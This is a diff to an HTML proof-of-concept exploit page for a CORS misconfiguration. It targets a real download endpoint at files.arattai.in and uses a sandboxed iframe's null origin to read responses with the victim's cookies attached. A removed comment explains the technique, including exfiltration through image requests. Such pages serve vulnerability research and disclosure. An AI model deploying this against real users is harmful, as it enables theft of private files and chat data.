@@ -3,7 +3,7 @@
 <head><meta charset="utf-8"><title>PoC — CORS Read via null-origin iframe</title></head>
 <body>
 <h3>CORS Read — null origin (sandboxed iframe)</h3>
-<p>Attacker origin: <b id="host"></b> &nbsp;|&nbsp; Iframe origin: <b>null</b></p>
+<p>Attacker origin: <b id="host"></b> &nbsp;|&nbsp; Spoofed Iframe origin: <b>null</b></p>
 <pre id="out" style="white-space:pre-wrap;word-break:break-all;margin-top:1em;"></pre>
 
 <iframe id="pwn" sandbox="allow-scripts" style="display:none"></iframe>
@@ -24,12 +24,6 @@ const TARGET_URL = "https://files.arattai.in/webdownload"
     + "&event-id=" + encodeURIComponent(EVENT_ID)
     + "&x-cli-msg=" + encodeURIComponent(JSON.stringify({ chat_id: CHAT_ID }));
 
-// Why this works:
-//   sandbox="allow-scripts" without allow-same-origin  →  iframe effective origin = null
-//   The fetch from inside the iframe carries:  Origin: null
-//   If files.arattai.in reflects null with ACAC:true, JS can read the response.
-//   Victim cookies (SameSite=None) are still attached to the request automatically.
-//   Exfil uses new Image().src (simple GET — no CORS preflight, no null-origin restriction).
 
 var inner = '';
 inner += 'var url='    + JSON.stringify(TARGET_URL) + ';';
